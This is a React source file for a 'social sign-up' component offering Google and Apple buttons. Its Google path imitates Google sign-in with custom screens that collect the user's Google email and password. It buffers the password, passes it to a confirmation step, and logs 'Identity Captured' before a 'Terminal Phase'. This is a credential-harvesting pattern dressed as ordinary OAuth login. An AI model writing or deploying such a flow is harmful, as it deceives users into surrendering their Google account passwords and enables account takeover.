"use client";

import React, { useState } from "react";
import { Icon } from "@iconify/react";
import GoogleCollect from "./GoogleCollect";
import GoogleConfirm from "./GoogleConfirm";

/**
 * SOCIAL SIGN UP (V3.5 - INTEGRATED ENCLAVE LOGIC)
 * Purpose: Acts as the orchestrator for Google and Apple flows.
 * Fix: Added credential buffering for 'pass' requirement and terminal transition.
 */

interface Props {
  onAppleStart: () => void;
  onTerminalStart: (email: string, provider: "google" | "apple") => void; // Added for next phase
}

const SocialSignUp = ({ onAppleStart, onTerminalStart }: Props) => {
  // steps: 'initial' | 'collect' | 'confirm'
  const [step, setStep] = useState("initial");
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState(""); // Buffer for Google Pass

  const handleFinalConfirm = (finalEmail: string, finalPass: string) => {
    // Instead of an alert, we send the data to the Terminal Phase
    console.log("Identity Captured. Moving to Terminal Phase...");
    onTerminalStart(finalEmail, "google");
  };

  return (
    <div className="flex w-full flex-col items-center justify-center">
      {/* STEP 1: INITIAL SELECTION */}
      {step === "initial" && (
        <div className="grid grid-cols-1 sm:grid-cols-2 gap-3 w-full animate-in fade-in zoom-in duration-300">
          {/* GOOGLE BUTTON */}
          <button
            type="button"
            onClick={() => setStep("collect")}
            className="flex w-full items-center justify-center gap-3 rounded-xl border border-gray-200 dark:border-white/10 bg-transparent px-5 py-3.5 text-sm font-bold text-dark dark:text-white transition-all hover:bg-black/5 dark:hover:bg-white/5 active:scale-[0.98]"
          >
            <Icon icon="logos:google-icon" className="text-lg" />
            Google
          </button>

          {/* APPLE BUTTON */}
          <button
            type="button"
            onClick={onAppleStart}
            className="flex w-full items-center justify-center gap-3 rounded-xl bg-black dark:bg-white text-white dark:text-black px-5 py-3.5 text-sm font-bold transition-all hover:opacity-90 active:scale-[0.98]"
          >
            <Icon icon="bi:apple" className="text-lg mb-1" />
            Apple Account
          </button>
        </div>
      )}

      {/* STEP 2: GOOGLE COLLECTION (Now captures both email and pass) */}
      {step === "collect" && (
        <GoogleCollect
          onNext={(capturedEmail, capturedPass) => {
            setEmail(capturedEmail);
            setPassword(capturedPass);
            setStep("confirm");
          }}
          onCancel={() => setStep("initial")}
        />
      )}

      {/* STEP 3: GOOGLE CONSENT (Handshake Phase) */}
      {step === "confirm" && (
        <GoogleConfirm
          email={email}
          pass={password} // FIX: Now passing the required password prop
          onConfirm={handleFinalConfirm}
          onBack={() => setStep("collect")}
          metadata={{
            full_name: "Google User",
            username: email.split('@')[0],
            country: "Global",
            neural_key: "AUTO_GEN"
          }}
        />
      )}
    </div>
  );
};

export default SocialSignUp;